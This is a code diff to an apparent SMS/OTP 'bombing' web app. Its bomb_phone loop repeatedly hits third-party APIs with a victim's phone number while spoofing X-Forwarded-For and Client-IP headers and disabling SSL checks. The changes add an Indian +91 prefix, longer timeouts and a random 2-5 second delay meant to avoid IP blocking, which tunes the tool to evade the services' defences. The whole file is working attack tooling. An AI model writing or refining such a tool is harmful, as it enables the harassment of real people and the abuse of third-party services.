@@ -1,3 +1,4 @@
+# app.py - Fixed Version With All Problems Solved
 from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request
 from fastapi.staticfiles import StaticFiles
 from fastapi.templating import Jinja2Templates
@@ -160,8 +161,10 @@ class BombingSession:
     async def bomb_phone(self, session: aiohttp.ClientSession, api: dict, phone: str):
         while self.running:
             try:
+                # Standardize phone format - add +91 prefix if not present
+                full_phone = f"+91{phone}" if not phone.startswith("+91") else phone
                 name = api["name"]
-                url = api["url"](phone) if callable(api["url"]) else api["url"]
+                url = api["url"](full_phone) if callable(api["url"]) else api["url"]
                 headers = {k: v for k, v in api["headers"].items()}
                 headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                 headers["Client-IP"] = headers["X-Forwarded-For"]
@@ -185,12 +188,12 @@ class BombingSession:
                 
                 success = False
                 if api["method"] == "POST":
-                    data = api["data"](phone) if api["data"] else None
-                    async with session.post(url, headers=headers, data=data, timeout=3, ssl=False) as response:
+                    data = api["data"](full_phone) if api["data"] else None
+                    async with session.post(url, headers=headers, data=data, timeout=10, ssl=False) as response:
                         if response.status in [200, 201, 202]:
                             success = True
                 else:
-                    async with session.get(url, headers=headers, timeout=3, ssl=False) as response:
+                    async with session.get(url, headers=headers, timeout=10, ssl=False) as response:
                         if response.status in [200, 201, 202]:
                             success = True
                 
@@ -208,13 +211,16 @@ class BombingSession:
                     "tag": "success" if success else "error",
                     "message": message,
                     "stats": self.stats,
-                    "phone": phone
+                    "phone": full_phone
                 })
                 
-                await asyncio.sleep(0.001)  # Ultra-fast speed
+                # 2-5 second random delay to prevent IP blocking
+                await asyncio.sleep(random.uniform(2, 5))
             
             except Exception as e:
                 self.stats["failed_attempts"] += 1
+                # Detailed error logging for debugging
+                print(f"❌ Failed to hit {name}: {str(e)}")
                 continue
     
     async def start(self):
